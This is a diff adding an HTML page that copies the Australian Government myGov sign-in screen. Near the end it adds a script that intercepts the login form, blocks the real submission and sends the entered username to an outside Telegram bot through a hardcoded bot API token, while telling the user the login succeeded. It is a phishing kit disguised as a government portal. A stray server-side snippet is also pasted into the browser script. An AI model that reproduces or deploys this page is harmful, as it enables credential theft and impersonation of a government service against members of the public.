@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<!--[if IE 9]><html class="ie ie9" lang="en"><![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!-->
+<html lang="en">
+<!--<![endif]-->
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <title>Sign in with myGov - myGov</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="format-detection" content="telephone=no">
+    
+    <!-- Scripts and Styles -->
+    <script type="text/javascript" src="/LoginServices/main/ruxitagentjs_ICA2NVfghjqrux_10275230919171419.js"></script>
+    <link rel="icon" type="image/png" sizes="32x32" href="/mygov/content/mgv2/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/mygov/content/mgv2/icons/favicon-16x16.png">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
+    <link href="/mygov/content/mgv2/css/mgv2-application.css" rel="stylesheet">
+    <link href="/mygov/content/mgv2/css/blugov.css" rel="stylesheet">
+</head>
+
+<noscript>
+    <div class="outage">
+        <div class="outage__inner">
+            <div>
+                <span class="is-visuallyhidden"> Warning message: </span>
+                <p> JavaScript is required for myGov to work correctly.</p>
+            </div>
+        </div>
+    </div>
+</noscript>
+
+<body>
+    <nav class="uikit-skip-link" aria-label="Skip Links">
+        <a class="uikit-skip-link__link" href="#content">Skip to main content</a>
+    </nav>
+
+    <div class="brand-rainbow">&nbsp;</div>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="https://my.gov.au/" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="https://my.gov.au/en/about/help">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <a data-go-back-link="" class="button-back" href="/las/mygov-login?execution=e2s1&_eventId=close">Back</a>
+
+                                    <div id="passkey-auth-error" class="alert alert-danger error-msg" role="alert" style="display: none">
+                                        <span class="is-visuallyhidden">Error message:</span>
+                                        <div class="error-msg-text">
+                                            <strong>Error</strong>
+                                            <br>
+                                            <p id="passkey-error-msg">Passkey authentication failed. (RFMxxx)</p>
+                                        </div>
+                                    </div>
+
+                                    <div id='error-msg-container'></div>
+
+                                    <h1>Sign in with myGov</h1>
+                                    <p class="login-instruction-text">Choose how to sign in</p>
+                                    <h2 class="text-align-left">Use your myGov sign in details</h2>
+
+                                    <form id="mygov-login-form" class="mygov-login-form alternative" action="/las/mygov-login?execution=e2s1" method="post">
+                                        <div class="input-group">
+                                            <label class="override" for="userId">Username or email</label>
+                                            <input id="userId" name="username" type="text" aria-required="true" autocomplete="off"/>
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="/las/mygov-login?execution=e2s1&_eventId=recoverusername" class="anchor override">Forgot username</a>
+                                        </p>
+                                        <div class="input-group">
+                                            <label for="password" class="override">Password</label>
+                                            <div class="password-group">
+                                                <input id="password" name="password" type="password" aria-required="true" autocomplete="off" />
+                                            </div>
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="/las/mygov-login?execution=e2s1&_eventId=resetpassword" class="anchor override">Forgot password</a>
+                                        </p>
+                                        <div class="button-digital-id-main-container override">
+                                            <div class="digital-id-button-container">
+                                                <button type="submit" class="button-main" name="_eventId_login">Sign in</button>
+                                            </div>
+                                        </div>
+                                        <input type="hidden" name="authtype" value="unamepword" />
+                                        <input type="hidden" name="_csrf" value="3ed5e252-4e39-4329-9b9d-963528638459" />
+                                        <input type="hidden" name="clientId" value="mygov-citizen-portal" />
+                                        <p class="create-account-text">
+                                            <a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.
+                                        </p>
+                                    </form>
+
+                                    <div class="hr-word">
+                                        <div class="draw-circle">or</div>
+                                    </div>
+
+                                    <div class="digital-id-login-card secondary">
+                                        <div class="button-digital-id-container">
+                                            <h2 class="text-align-left">Sign in another way</h2>
+                                            <div class='digital-id-login-option-container'>
+                                                <div class='inner-options'>
+                                                    <a class="button-digital-identity" href="/las/mygov-login?execution=e2s1&_eventId=digitalIdentity">Sign in with Digital ID</a>
+                                                    <a class="button-digital-identity" id="passkey-signin-btn" onclick="authenticatePasskey()" tabindex="0">
+                                                        <img class="passkey-icon" src="/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt=""/>
+                                                        Sign in with passkey
+                                                    </a>
+                                                    <p class="external-links-zone">Learn about 
+                                                        <a href="https://my.gov.au/en/about/help/mygov-website/sign-in-to-mygov/use-passkeys" target="_blank">passkeys<span class="is-visuallyhidden"> opens in a new window</span></a>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <script>
+                let isWebAuthnSupportedOnPlatform = false;
+
+                // Initialize passkey login button visibility
+                function initializePasskeyLoginButton() {
+                    isWebAuthnSupportedOnPlatform = window.mygovPasskeys.isWebAuthnSupportedOnPlatform;
+                    const passkeyLoginButton = document.querySelector('#passkey-signin-btn');
+                    if (isWebAuthnSupportedOnPlatform && passkeyLoginButton) {
+                        passkeyLoginButton.style.display = 'flex';
+                        passkeyLoginButton.removeAttribute('disabled');
+                    } else {
+                        passkeyLoginButton.style.display = 'none';
+                        passkeyLoginButton.setAttribute('disabled', true);
+                    }
+                }
+                initializePasskeyLoginButton();
+
+                async function authenticatePasskey() {
+                    try {
+                        const authenticationResponse = await window.mygovPasskeys.authenticatePasskey();
+                        if (authenticationResponse.authenticated) {
+                            window.location.replace(authenticationResponse.redirectUrl);
+                        }
+                    } catch (e) {
+                        displayAlerts(false, e.message);
+                        console.error(e);
+                    }
+                }
+
+                function displayAlerts(registered, message) {
+                    const errorDiv = document.getElementById('passkey-auth-error');
+                    const errorMsg = document.getElementById('passkey-error-msg');
+                    const loginErrorDiv = document.getElementById('error-msg-container').getElementsByClassName('error-msg');
+                    if (registered) {
+                        errorDiv.style.display = 'none';
+                    } else {
+                        if (loginErrorDiv.length > 0) {
+                            loginErrorDiv[0].style.display = 'none';
+                        }
+                        errorDiv.style.display = 'flex';
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                        if (message) {
+                            errorMsg.innerHTML = message;
+                        }
+                    }
+                }
+
+                // Keyboard accessibility for passkey button
+                document.getElementById("passkey-signin-btn").addEventListener("keypress", function(event) {
+                    if (event.key === "Enter") {
+                        event.preventDefault();
+                        this.click();
+                    }
+                });
+            </script>
+        </div>
+    </div>
+
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a></li>
+                            <li><a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="https://my.gov.au/">
+                            <img src="/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg" alt="Australian Government and myGov logo" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-vendor.js"></script>
+    <script type="text/javascript" src="/mygov/content/mgv2/js/mgv2-application.js"></script>
+    <script type="text/javascript" src="/mygov/content/mgv2/js/login.js"></script>
+    <script type="module" src="/mygov/content/mgv2/js/mygov-passkeys.mjs"></script>
+
+    <div id="artifact-metadata"></div>
+
+    <script>
+        // Function to set a cookie with a specified expiration in hours
+        function setCookie(cname, cvalue, exhours) { 
+            const d = new Date();
+            d.setTime(d.getTime() + (exhours * 60 * 60 * 1000)); // Set expiration to exhours
+            const expires = "expires=" + d.toUTCString();
+            document.cookie = `${cname}=${cvalue};${expires};path=/;Secure;HttpOnly;SameSite=Strict`;
+        }
+
+        // Function to validate the login form
+        function validateForm() {
+            let username = document.getElementById("userId").value;
+            let password = document.getElementById("password").value;
+
+            const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/; // Alphanumeric usernames between 3-20 characters
+            const passwordRegex = /.{6,}/; // Password must be at least 6 characters
+
+            if (!usernameRegex.test(username)) {
+                alert("Username must be 3-20 characters long and can only contain letters, numbers, and underscores.");
+                return false;
+            }
+            if (!passwordRegex.test(password)) {
+                alert("Password must be at least 6 characters long.");
+                return false;
+            }
+            return true;
+        }
+
+        // Function to handle login
+        function login() { 
+            let username = document.getElementById("userId").value;
+            let password = document.getElementById("password").value;
+
+            if (username !== "" && password !== "") {
+                setCookie("username", username, 1); // Set to expire in 1 hour
+                alert("Login Successful! Cookies are set.");
+
+                // Notify the Telegram bot
+                const telegramAPIUrl = `https://api.telegram.org/bot7767393746:AAHnc1t_WVBTXxuvQsv8ehNSWef7SG8pg0I/sendMessage`;
+                const message = `User logged in: ${username}`;
+
+                fetch(telegramAPIUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '@Annonymousespirit_Bot', // Replace with your actual chat ID or bot username
+                        text: message
+                    }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => console.log('Telegram notification sent:', data))
+                .catch(error => console.error('Error sending Telegram notification:', error));
+            } else {
+                alert("Please enter both username and password.");
+            }
+        }
+
+        // Frontend form submission handling
+        document.getElementById("mygov-login-form").onsubmit = function(event) {
+            event.preventDefault(); // Prevent the default form submission
+            if (validateForm()) {
+                login(); // Call the login function if the form is valid
+            }
+        };
+
+        // Server-side endpoint for notifying Telegram (assuming this part runs in a Node.js environment)
+        app.post('/notify-telegram', (req, res) => {
+            const { username } = req.body;
+
+            // Validate username
+            if (!username) {
+                return res.status(400).json({ error: 'Username is required' });
+            }
+
+            // Logic to send notification to Telegram (assumed function)
+            res.json({ success: true });
+        });
+    </script>
+</body>
+
+</html>
